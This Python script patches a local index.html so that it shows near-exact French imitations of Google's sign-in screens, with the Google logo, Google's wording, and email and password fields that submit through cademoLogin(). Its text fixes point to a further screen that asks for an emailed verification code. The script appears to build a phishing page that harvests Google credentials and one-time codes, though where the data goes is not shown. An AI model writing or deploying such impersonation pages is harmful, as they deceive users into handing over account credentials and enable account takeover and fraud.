import re

with open('C:/Users/Leo/cademo/index.html', 'r', encoding='utf-8') as f:
    content = f.read()

def find_matching_closing_div(text, start_idx):
    depth = 0
    pos = start_idx
    while pos < len(text):
        if text[pos:pos+4] == '<div':
            if pos + 4 < len(text) and text[pos+4] in (' ', '>', chr(10), chr(9), chr(13)):
                depth += 1
            pos += 4
        elif text[pos:pos+6] == '</div>':
            depth -= 1
            if depth == 0:
                return pos + 6
            pos += 6
        else:
            pos += 1
    return -1

def replace_block(content, div_id, new_block):
    start_marker = '<div id="' + div_id + '"'
    start_idx = content.find(start_marker)
    if start_idx == -1:
        print('Warning: could not find ' + div_id)
        return content
    search_start = max(0, start_idx - 200)
    comment_start = content.rfind('<!--', search_start, start_idx)
    if comment_start != -1 and 'Design exact' in content[comment_start:start_idx]:
        actual_start = comment_start
    else:
        actual_start = start_idx
    end_idx = find_matching_closing_div(content, start_idx)
    if end_idx == -1:
        print('Warning: could not find closing div for ' + div_id)
        return content
    return content[:actual_start] + new_block + content[end_idx:]

new_email = '''    <!-- Écran 1 : Saisie de l'email - Design exact IMG_0525 -->
    <div id="page-email" class="screen" style="background:#fff;min-height:100vh;padding:24px;">
        <div style="max-width:400px;margin:0 auto;padding-top:24px;">
            <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" style="width:48px;height:48px;margin:0 0 16px 0;display:block;">
                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
            </svg>
            <h1 class="google-title" style="font-size:32px;font-weight:400;margin-bottom:12px;color:#202124;font-family:'Google Sans',Roboto,Arial,sans-serif;">Connexion</h1>
            <p class="google-subtitle" style="font-size:16px;line-height:1.5;margin-bottom:24px;color:#202124;font-family:Roboto,Arial,sans-serif;">
                Utilisez votre compte Google. Vous vous connecterez également aux services Google dans vos applications et dans Safari.
            </p>
            <div style="margin-bottom:8px;">
                <input type="text" id="emailInput" placeholder="Adresse e-mail ou téléphone"
                    style="border:1px solid #dadce0;border-radius:4px;padding:14px 16px;font-size:16px;width:100%;box-sizing:border-box;outline:none;font-family:Roboto,Arial,sans-serif;transition:all 0.2s;"
                    onfocus="this.style.borderColor='#1a73e8';this.style.boxShadow='inset 0 -2px 0 #1a73e8'"
                    onblur="this.style.borderColor='#dadce0';this.style.boxShadow='none'">
            </div>
            <a href="#" class="google-link" style="color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;margin:8px 0 32px 0;display:inline-block;font-family:Roboto,Arial,sans-serif;">Adresse e-mail oubliée ?</a>
            <div class="google-actions" style="display:flex;justify-content:space-between;align-items:center;margin-top:32px;">
                <button class="google-btn-text" onclick="showScreen('page-start')" style="background:none;border:none;color:#1a73e8;font-size:14px;font-weight:500;cursor:pointer;padding:8px;font-family:'Google Sans',Roboto,Arial,sans-serif;">Créer un compte</button>
                <button class="google-btn-primary" onclick="goToPassword()" style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans',Roboto,Arial,sans-serif;">Suivant</button>
            </div>
        </div>
    </div>'''

new_password = '''    <!-- Écran 2 : Saisie du mot de passe - Design exact IMG_0526 -->
    <div id="page-password" class="screen" style="background:#fff;min-height:100vh;padding:24px;">
        <div style="max-width:450px;margin:0 auto;padding-top:24px;">
            <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" style="width:48px;height:48px;margin-bottom:16px;">
                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
            </svg>
            <h1 style="font-size:44px;font-weight:400;margin-bottom:8px;color:#202124;font-family:'Google Sans',Roboto,Arial,sans-serif;">Bienvenue</h1>
            <p style="font-size:16px;line-height:1.5;margin-bottom:16px;color:#202124;font-family:Roboto,Arial,sans-serif;">
                Afin de pouvoir utiliser votre compte Google, vous devez vous connecter.
            </p>
            <div id="emailChip" style="display:inline-flex;align-items:center;gap:10px;padding:6px 12px 6px 6px;margin:0 0 24px;background:#fff;cursor:pointer;">
                <div style="width:28px;height:28px;border-radius:50%;background:#9e9e9e;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="white">
                        <circle cx="12" cy="8" r="4"/>
                        <path d="M4 20c0-4 4-6 8-6s8 2 8 6"/>
                    </svg>
                </div>
                <span id="displayEmail" style="font-size:14px;color:#3c4043;font-family:Roboto,Arial,sans-serif;">Chargement...</span>
                <span style="color:#5f6368;font-size:10px;">&#9660;</span>
            </div>
            <div style="margin-bottom:8px;">
                <input type="password" id="passwordInput" placeholder="Saisissez votre mot de passe"
                    style="border:1px solid #dadce0;border-radius:4px;padding:14px 16px;font-size:16px;width:100%;box-sizing:border-box;outline:none;font-family:Roboto,Arial,sans-serif;transition:all 0.2s;"
                    onfocus="this.style.borderColor='#1a73e8';this.style.boxShadow='inset 0 -2px 0 #1a73e8'"
                    onblur="this.style.borderColor='#dadce0';this.style.boxShadow='none'">
            </div>
            <div style="display:flex;align-items:center;gap:16px;margin:16px 0 32px 0;">
                <input type="checkbox" id="showPass" style="width:18px;height:18px;cursor:pointer;accent-color:#1a73e8;" onchange="var p=document.getElementById('passwordInput');p.type=this.checked?'text':'password';">
                <label for="showPass" style="font-size:16px;color:#202124;cursor:pointer;font-family:Roboto,Arial,sans-serif;">Afficher le mot de passe</label>
            </div>
            <div style="display:flex;justify-content:space-between;align-items:center;">
                <a href="#" style="color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;font-family:'Google Sans',Roboto,Arial,sans-serif;">Mot de passe oublié ?</a>
                <button onclick="cademoLogin();" style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans',Roboto,Arial,sans-serif;">Suivant</button>
            </div>
        </div>
    </div>'''

content = replace_block(content, 'page-email', new_email)
content = replace_block(content, 'page-password', new_password)

# Fix remaining encoding issues
content = content.replace('Pour securiser votre compte', 'Pour sécuriser votre compte')
content = content.replace('une notification sur votre boite mail Gmail', 'une notification sur votre boîte mail Gmail')
content = content.replace("vous a ete envoyee a l'adresse", "vous a été envoyée à l'adresse")
content = content.replace("Vous n'avez pas recu le code", "Vous n'avez pas reçu le code")
content = content.replace('Verifiez votre adresse e-mail', 'Vérifiez votre adresse e-mail')
content = content.replace('Mot de passe oublie ?', 'Mot de passe oublié ?')

with open('C:/Users/Leo/cademo/index.html', 'w', encoding='utf-8') as f:
    f.write(content)

print('Done fixing auth screens')
